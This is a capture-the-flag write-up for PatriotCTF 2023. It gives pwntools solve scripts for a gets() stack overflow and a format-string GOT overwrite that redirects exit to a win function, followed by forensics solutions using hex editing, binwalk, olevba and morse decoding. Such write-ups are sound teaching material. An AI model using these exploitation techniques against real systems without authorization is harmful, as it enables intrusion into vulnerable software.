# Guessing Game [100 PTS]
Lets decompile using Ghidra and rename some variables:

![decompilation of binary](/assets/pctf2023/pwn/guessinggame/decompiled.png)

We can see that there is a vulnerable call to `gets` in line 13. We can also see in line 21 that the binary checks if `target` is not zero. If it isn't zero, we get the flag. 
<br/>
<br/>
`gets` will not check how long the user's input is and will store whatever input is given to it, on the [stack](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/).  Since the `target` variable is on the stack as well, we can overwrite the variable and get the flag!
<br/>
<br/>
To find the number of characters we need to overwrite the `target` variable, we can look at the stack layout provided by Ghidra. To show this layout just click on any of the variables' declarations.

![stack layout of binary](/assets/pctf2023/pwn/guessinggame/stack_layout.png)
<br/>
<br/>

From this we can see that our input is stored at `$rbp-0x138` and `target` is stored at `$rbp-0xc`.
<br/>
<br/>
Subtracting 0xc from 0x140 gives us 308, which is how many bytes we need to write in order to overwrite the `target` variable. 
<br/>
<br/>

> ``NOTE:`` The `outputFlag()` function tries to open a file called flag.txt, so when testing locally, make sure to put a fake flag in the same directory as the binary.

Here is the final solve script:
<br/>
```python
from pwn import *
context.binary = binary = ELF('./guessinggame')

#p = process()
p = remote('chal.pctf.competitivecyber.club', 9999)
payload = b'a'*308

p.sendline(payload)
p.interactive()
```

# Printshop [384 PTS]
Again, lets decompile this binary in Ghidra. 

![Printshop binary decompiled](/assets/pctf2023/pwn/printshop/decompiled.png)

<br/>

We can see that there is a format string vulnerability on line 14, since we are taking the user's input and printing it without any format specifiers. This means that the user can supply their own format specifiers like `%n` which can be used to write to memory addresses. 
<br/>

Also notice that instead of returning, the program calls `exit`. I also saw that there is a win function which is what our target is. 
<br/>
![win function](/assets/pctf2023/pwn/printshop/winfunc.png)
<br/>

We can do a GOT overwrite so that `exit` points to `win`. This means that when the program calls `exit`, it will actually call `win`. For more information on format string vulnerabilities, I recommend going through [pwn.college's format string exploits module](https://pwn.college/cse494-s2023/format-string-exploits). 

Before we do the GOT overwrite, we need to make sure that the GOT has write permissions. To check this, we can use `checksec`, a command line utility to check security protections on a binary. Running `checksec printshop` outputs:
<br/>

![checksec output](/assets/pctf2023/pwn/printshop/checksec.png)

Since there is `Partial RELRO`, we can overwrite the GOT.

<br/>
To perform this exploit, we can use pwntools' `fmtstr` class. 
<br/>

Here is the final solve script:
<br/>
```python
from pwn import *
context.binary = binary = ELF('./printshop')

def exec_func(payload): # this function is used so that pwntools can find the offset of our input buffer and other things like padding
        with remote('chal.pctf.competitivecyber.club', 7997) as p:
                p.sendline(payload)
                p.recvuntil(b'buisness!')
                p.recvline()
                p.recvline()
                out = p.recvline()
                log.info(out)
                return out

#p = process()
p = remote('chal.pctf.competitivecyber.club', 7997)
fmtstr = FmtStr(exec_func)
payload = b'a'*fmtstr.padlen + fmtstr_payload(fmtstr.offset, {binary.got.exit: binary.symbols.win})

p.sendline(payload)
p.interactive()

```


## Forensics

# Unsupported Format [100 PTS]

First I opened the jpg file that was provided and saw that it was corrupted. So I opened it up in a [hex editor](https://hexed.it/) to see the bytes. 

After scrolling through the bytes I saw this:

![corrupted bytes](/assets/pctf2023/forensics/unsupported_format/corrupted_bytes.png)

I deleted the bytes and saved the file. Opening that file gets us the flag:

![flag file](/assets/pctf2023/forensics/unsupported_format/flag.jpg)

<br/>
# Unsupported Format 2 [386 PTS]

Like [Unsupported Format 1](#unsupported-format-100-pts), I opened the file in a [hex editor](https://hexed.it/) to see the bytes.

After scrolling through the bytes I saw this: 

![more corrupted bytes](/assets/pctf2023/forensics/unsupported_format_2/corrupted_bytes.png)

I wrote a simple python script to open the file and get rid of the `CORRUPTED` bytes. Here is the script:

``` python
def remove_corrupted_bytes(input_file, output_file):
    with open(input_file, 'rb') as file:
        file_data = file.read()

    corrupted_pattern = b'CORRUPTED'

    cleaned_data = file_data.replace(corrupted_pattern, b'')

    with open(output_file, 'wb') as file:
        file.write(cleaned_data)


input_file = "corrupted.jpg"
output_file = "uncorrupted.jpg"

remove_corrupted_bytes(input_file, output_file)
```

This saves the uncorrupted file into a file called `uncorrupted.jpg`. 

`uncorrupted.jpg` gives us another file that looks like this: 

![uncorrupted version of original file](/assets/pctf2023/forensics/unsupported_format_2/uncorrupted.jpg)

Running `binwalk` on `uncorrupted.jpg` shows this:

![binwalk output on uncorrupted.jpg](/assets/pctf2023/forensics/unsupported_format_2/binwalk.png)

After changing the extracted files to their correct extensions with the `file` command, there was a corrupted tiff file.

![file tiff command](/assets/pctf2023/forensics/unsupported_format_2/file_tiff.png)

Putting the tiff file into a [hex editor](https://hexed.it/) showed the same `CORRUPTED` bytes as the original file. After running my earlier python program to get rid of the `CORRUPTED` bytes, I got a new file.

![more corrupted bytes](/assets/pctf2023/forensics/unsupported_format_2/corrupted_tiff_bytes.png)

Running `binwalk` on the new file shows this:


![2nd binwalk](/assets/pctf2023/forensics/unsupported_format_2/2ndbinwalk.png)

After extracting the files from it using `binwalk -D='.*' uncorrupted.jpg` and using the `file` command, we can see that there is a zip archive.

![zip archive](/assets/pctf2023/forensics/unsupported_format_2/zip_archive_found.png)

Unzipping it, we get a new file called `Monitor.jpg`. I was stuck here for a while because this is what the image shows:

![monitor file](/assets/pctf2023/forensics/unsupported_format_2/Monitor.jpg)

Then I decided to use [aperisolve](https://www.aperisolve.com/).

Going through some of the results, we can find the flag:

![flag](/assets/pctf2023/forensics/unsupported_format_2/flag.png)

## Congratulations [100 PTS]

First I installed `oletools` by running `sudo pip install -U oletools`.

After that I ran `olevba congratulations.docm`

Scrolling through the output, I saw an interesting line:

```
x49 = [char]0x50 + [char]0x43 + [char]0x54 + [char]0x46 + [char]0x7B + [char]0x33 + [char]0x6E + [char]0x34 + [char]0x62 + [char]0x6C + [char]0x33 + [char]0x5F + [char]0x6D + [char]0x34 + [char]0x63 + [char]0x72 + [char]0x30 + [char]0x35 + [char]0x5F + [char]0x70 + [char]0x6C + [char]0x7A + [char]0x5F + [char]0x32 + [char]0x37 + [char]0x33 + [char]0x31 + [char]0x35 + [char]0x36 + [char]0x37 + [char]0x30 + [char]0x7D
```

These codes looked like ascii so I put it into [CyberChef](https://gchq.github.io/CyberChef/) and replaced `[char]` with nothing. Decoding from hex, we get the flag:

![cyberchef flag](/assets/pctf2023/forensics/congratulations/bigger_flag_image.png)

## Capybara [100 PTS]

First I ran binwalk on the jpg:

![binwalk files](/assets/pctf2023/forensics/capybara/binwalk_results.png)

We can see that there is an audio file called `audio.wav`

Listening to this, it is obvious that it is morse code. So I put it into a [morse code decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
and got this as my result:

![morsecode results](/assets/pctf2023/forensics/capybara/morsecode_decode_results.png)

Putting these characters into [CyberChef](https://gchq.github.io/CyberChef/):

![flag](/assets/pctf2023/forensics/capybara/cyberchef%20results.png)

> ``NOTE:`` Make sure to get rid of the spaces between the characters, or else it won't decode properly.
